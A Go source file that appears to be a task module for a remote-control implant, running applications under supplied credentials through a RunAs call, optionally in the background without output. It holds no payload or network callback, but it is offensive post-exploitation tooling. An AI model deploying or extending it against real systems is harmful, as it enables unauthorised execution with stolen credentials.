package main

/*
#include <stdlib.h>
*/
import "C"

import (
	"fmt"
	"sync"
)

type Task struct {
	TaskId      string   `json:"taskid"`
	Username    string   `json:"username"`
	Password    string   `json:"password"`
	Domain      string   `json:"domain"`
	Application []string `json:"application"`
	Background  string     `json:"background"`

	// General Purpose
	status   string
	tasktype string

	mu *sync.Mutex
}

func InitialiseTask(task *Task) error {
	task.tasktype = "respinlineexecute"
	task.mu = &sync.Mutex{}
	return nil
}

func TaskHandler(task *Task) (stdout []byte, err error) {
	task.status = "completed"

	//username := task.Username
	//password := task.Password
	//domain := task.Domain
	//application := task.Application

	if task.Background == "background" {
		newTaskList := []*Task{}
		for i := 0; i < len(TASK_LIST); i++ {
			if !IsTaskDone(*TASK_LIST[i]) {
				newTaskList = append(newTaskList, TASK_LIST[i])
			}
		}
		TASK_LIST = newTaskList

		go RunAs(task.Username, task.Password, task.Domain, task.Application, true)
		return []byte("Runned what you want in background, no output will be printed"), nil
	} else {
		stdout, err = RunAs(task.Username, task.Password, task.Domain, task.Application, false)
	}

	if err != nil {
		fmt.Println("Fail")
		task.status = "failed"
		return []byte(stdout), err
	}
	fmt.Println("Done Executing")
	fmt.Println("Result From DLL --->")
	return []byte(stdout), nil
}

// Tell us if task if done (failed or completed)
func IsTaskDone(task Task) bool {
	if task.status == "completed" || task.status == "failed" {
		return true
	}
	return false
}

// Return Task Status
func ComputeTaskStatus(task Task) string {
	return task.status
}

// Return Task Type
func ComputeTaskType(task Task) string {
	return task.tasktype
}
